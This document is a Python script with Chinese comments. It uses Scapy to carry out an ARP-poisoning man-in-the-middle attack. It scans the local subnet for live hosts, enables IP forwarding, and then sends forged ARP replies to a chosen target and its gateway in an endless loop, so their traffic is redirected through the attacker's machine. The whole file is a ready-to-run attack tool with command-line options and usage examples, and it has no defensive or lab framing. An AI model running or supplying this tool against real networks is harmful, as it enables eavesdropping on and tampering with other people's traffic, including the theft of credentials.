#!/usr/bin/python3
# -*- coding: utf-8 -*-

from scapy.all import *
import re
import time
import sys
import os
import optparse


#存放本机的MAC地址
lmac = ""
#存放本机的IP地址
lip = ""
#存放存活主机的IP和MAC的字典
liveHost = {}

#获取存活主机的IP和MAC地址函数
def GetAllMAC():
    #IP扫描列表
    scanList = lip + '/24'
    try:
        #通过对每个IP都进行ARP广播，获得存活主机的MAC地址
        ans,unans = srp(Ether(dst='FF:FF:FF:FF:FF:FF')/ARP(pdst=scanList),timeout=2)
    except Exception as e:
        print(e)
    #ARP广播发送完毕后执行
    else:
        #ans包含存活主机返回的响应包和响应内容
        for send,rcv in ans:
            #对响应内容的IP地址和MAC地址进行格式化输出，存入addrList
            addrList = rcv.sprintf('%Ether.src%|%ARP.psrc%')
            #把IP当作KEY，MAC当作VAULE 存入liveHost字典
            liveHost[addrList.split('|')[1]] = addrList.split('|')[0]

#根据IP地址获取主机的MAC地址
def GetOneMAC(targetIP):
    #若该IP地址存在，则返回MAC地址
    if targetIP in liveHost.keys():
        return liveHost[targetIP]
    else:
        return 0

#ARP毒化函数，分别写入目标主机IP地址，网关IP地址，网卡接口名
def poison(targetIP,gatewayIP,ifname):
    #获取毒化主机的MAC地址
    targetMAC = GetOneMAC(targetIP)
    #获取网关的MAC地址
    gatewayMAC = GetOneMAC(gatewayIP)
    if targetMAC and gatewayMAC:
        #用while持续毒化
        while True:
            #对目标主机进行毒化
            sendp(Ether(src=lmac,dst=targetMAC)/ARP(hwsrc=lmac,hwdst=targetMAC,psrc=gatewayIP,pdst=targetIP,op=2),iface=ifname,verbose=False)
            #对网关进行毒化
            sendp(Ether(src=lmac,dst=gatewayMAC)/ARP(hwsrc=lmac,hwdst=gatewayMAC,psrc=targetIP,pdst=gatewayIP,op=2),iface=ifname,verbose=False)
            time.sleep(1)
    else:
        print("目标主机/网关主机IP有误，请检查!")
        sys.exit(0)



if __name__ == '__main__':
    parser = optparse.OptionParser('usage:python %prog -r targetIP -g gatewayIP -i iface \n\n'
                         'Example: python %prog -r 192.168.1.130 -g 192.168.61.254 -i eth0')
    #添加目标主机参数 -r
    parser.add_option('-r','--rhost',dest='rhost',default='192.168.1.1',type='string',help='target host')
    #添加网关参数 -g
    parser.add_option('-g','--gateway',dest='gateway',default='192.168.1.254',type='string',help='target gateway')
    #添加网卡参数 -i
    parser.add_option('-i','--iface',dest='iface',default='eth0',type='string',help='interfaces name')
    (options, args) = parser.parse_args()
    lmac = get_if_hwaddr(options.iface)
    lip = get_if_addr(options.iface)
    print("===开始收集存活主机的IP和MAC===")
    GetAllMAC()
    print("===收集完成===")
    print("===收集数量:{0}===".format(len(liveHost)))
    print("===开启路由转发功能==")
    os.system("echo 1 >> /proc/sys/net/ipv4/ip_forward")
    os.system("sysctl net.ipv4.ip_forward")
    print("===开始进行ARP毒化===")
    try:
        poison(options.rhost,options.gateway,options.iface)
    except KeyboardInterrupt:
        print("===停止ARP毒化===")
        print("===停止路由转发功能===")
        os.system("echo 0 >> /proc/sys/net/ipv4/ip_forward")
        os.system("sysctl net.ipv4.ip_forward") 